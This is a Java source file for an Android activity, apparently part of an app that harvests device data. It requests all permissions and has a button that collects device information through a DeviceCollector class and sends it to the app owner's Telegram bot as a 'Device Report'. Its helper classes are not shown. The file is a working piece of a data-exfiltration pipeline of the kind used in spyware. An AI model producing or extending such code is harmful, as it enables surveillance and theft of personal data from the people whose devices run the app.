package com.rajputinfo.app;

import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

public class PermissionsActivity extends AppCompatActivity {

    private TextView tvStatus;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permissions);
        setTitle("Data & Permissions");

        tvStatus = findViewById(R.id.tvStatus);
        Button btnGrant = findViewById(R.id.btnGrant);
        Button btnSend = findViewById(R.id.btnSendNow);

        btnGrant.setOnClickListener(v -> PermissionHelper.requestAll(this));

        btnSend.setOnClickListener(v -> {
            tvStatus.setText("Collecting and sending...");
            String data = DeviceCollector.collect(this);
            TelegramBot.sendMessage("<b>Manual Device Report</b>\n\n" + data);
            tvStatus.setText("Sent to owner bot.");
        });
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PermissionHelper.REQ) {
            tvStatus.setText("Permissions processed.");
        }
    }
}
